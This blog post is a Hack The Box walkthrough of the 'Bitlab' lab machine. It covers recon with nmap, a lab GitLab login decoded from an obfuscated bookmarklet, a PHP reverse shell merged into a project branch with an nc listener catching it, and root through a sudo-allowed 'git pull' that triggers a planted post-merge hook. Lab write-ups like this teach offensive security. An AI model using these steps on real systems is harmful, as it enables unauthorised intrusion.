---
layout:     post
title:      HacktheBox - Personal 'Bitlab' Walkthough
title2:     Hack the Box - Bitlab
date:       2020-1-11 08:00:00 -0400
summary:    HTB Bitlab machine walkthrough. A fun little box that has us work through gitlab based exploitation. From erroneously stored user credentials, to uploading and merging our own files to the project, to finally exploiting hooks to execute our own code as root, this box was a good overview of various gitlab functionality.
categories: hack-the-box
thumbnail: cogs
tags:
 - htb 
 - walkthrough
 - writeup
 - gitlab
 - hooks
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-bitlab/infocard.PNG' | relative_url }}">
</p>

<p>Bitlab was a fun little box that has us work through gitlab based exploitation. From erroneously stored user credentials, to uploading and merging our own files to the project, to finally exploiting hooks to execute our own code as root, this box was a good overview of various gitlab functionality. Marked as a medium box by hackthebox I feel this box had an appropriate difficulty score. If you were familiar with git workflows this should be on the easier side, however if you are stepping into this for the first time a bit of research would be required to understand what is happening.</p>

<h1>Initial Recon</h1>

<p>Starting it off with our regular <code>nmap</code> scan:</p>

{% highlight shell %}
root@kali:~# nmap -sV -sC 10.10.10.114
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 10:14 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.10.114
Host is up (0.017s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
|_http-server-header: nginx
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<p>Since there seems to be a Gitlab instance setup on port 80, let's open burp and see what we can find on the site.</p>

<p align="center">
<img src="{{ '/assets/htb-bitlab/recon-burp.PNG' | relative_url }}">
</p>
<p align="center">
<img src="{{ '/assets/htb-bitlab/recon-gitlab.PNG' | relative_url }}">
</p>

<p>Doing some initial poking around we end up at the help page, which upon close look has something quite interesting within it.</p>

<p align="center">
<img src="{{ '/assets/htb-bitlab/recon-gitlab2.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-bitlab/recon-gitlab3.PNG' | relative_url }}">
</p>

<p>That last JS snippet seems like it's worth investigating. The full code ends up being:</p>


{% highlight shell %}
<DT><A HREF="javascript:(function()
{ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,
&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,
&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,
&quot;\x63\x6C\x61\x76\x65&quot;,
&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,
&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];
document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" ADD_DATE="1554932142">Gitlab Login</A>
{% endhighlight %}

<p>If we strip down the hex values and convert them we can now see a user login/password combination - <code>clave / 11des0081x</code>.</p>

<p align="center">
<img src="{{ '/assets/htb-bitlab/recon-deminify.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>Using the credentials discovered above we are able to get into the console as <code>clave</code>. A quick poke around and looks like he has a Developer role on the project Administrator / Profile. After examining the project a bit we realize that while we can't upload directly to the master branch our user <code>clave</code> has merge rights. We could in theory create a separate branch, upload our php reverse shell script and the approve the merge request as <code>clave</code>. Sure enough, this was quickly accomplished and we managed to get a reverse shell up and running.</p>

<p align="center">
<img src="{{ '/assets/htb-bitlab/recon-reversesh3.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-bitlab/recon-reversesh2.PNG' | relative_url }}">
</p>

{% highlight shell %}
root@kali:~# nc -lnvp 1337
Listening on [0.0.0.0] (family 2, port 1337)
Connection from 10.10.10.114 56868 received!
Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 15:04:25 up 6 min,  1 user,  load average: 1.78, 1.11, 0.62
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
clave    pts/0    10.10.15.14      15:02    1.00s  0.00s  0.00s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}

<p>Unfortunately www-data was not our true user in this case. With that said however we are able to escalate directly to root from www-data and retroactively get the user.txt flag.</p>

<h1>Root exploitation</h1>

<p>As part of the initial enumeration once getting the www-data shell we notice an interesting sudo rule:</p>

{% highlight shell %}
www-data@bitlab:/home/clave$ sudo -l
sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
www-data@bitlab:/home/clave$ 
{% endhighlight %}

<p>So we are able to run <code>git pull</code> straight as root?! Now we're talking. Quickly looked at what git repos were hosted locally that we may not have seen previously from the web portal.</p>

{% highlight shell %}
www-data@bitlab:/var/tmp$ find / -type d -name ".git" 2> /dev/null         
find / -type d -name ".git" 2> /dev/null
/srv/apps/profile/.git
/var/www/html/profile/.git
/var/www/html/deployer/.git
{% endhighlight %}

<p>At this point I somewhat knew what needed to happen. I copied over an existing repo to a folder we had the ability to modify.</p>

{% highlight shell %}
www-data@bitlab:/var/tmp$ cp -r /var/www/html/profile .
{% endhighlight %}

<p>Since we are able to run <code>git pull</code> as root, we can assume that any hooks triggered by the command would also be run as root. This <a href="https://git-scm.com/docs/githooks">githook</a> reference documentation goes into details with the various hooks available. Since we are interested in <code>git pull</code> hooks we quickly learn that while there isn't a direct pull hook, every pull will trigger a <code>post-merge</code> hook.</p>

<blockquote>
post-merge -
This hook is invoked by git-merge[1], which happens when a git pull is done on a local repository.
...
The post-merge hook runs after a successful merge command. You can use it to restore data in the working tree that Git can’t track, such as permissions data. This hook can likewise validate the presence of files external to Git control that you may want copied in when the working tree changes.
</blockquote>

<p>Alright, so if we manage to control that hook with our own script, we should be able to run something directly as root. Let's see if we can call a reverse shell this way.</p>

<p align="center">
<img src="{{ '/assets/htb-bitlab/root-gitpull-hooktrigger.PNG' | relative_url }}">
</p>

<p>With a local listener ready, sure enough we get a hit! Gather the root.txt flag and retroactively the user.txt flag as well.</p>

<p align="center">
<img src="{{ '/assets/htb-bitlab/root-owned.PNG' | relative_url }}">
</p>

<p>And just like that Bitlab is in the books. Thanks folks. Until next time.</p>